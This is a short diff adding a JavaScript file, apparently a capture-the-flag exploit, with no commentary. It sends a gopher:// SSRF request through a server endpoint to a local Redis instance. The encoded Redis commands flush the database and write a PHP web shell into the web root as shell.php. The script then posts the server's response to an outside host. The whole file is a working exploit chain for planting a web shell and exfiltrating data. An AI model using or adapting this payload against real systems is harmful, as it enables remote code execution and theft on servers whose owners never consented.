@@ -1,0 +1,12 @@
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "request.php", true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", "http://afcidk.nctu.me/response.php", true);
+        xhr2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr2.send("content="+encodeURI(xhr.responseText));
+    }
+};
+xhr.send("url=gopher%3A%2F%2F127.0.0.1%3A25566%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A");
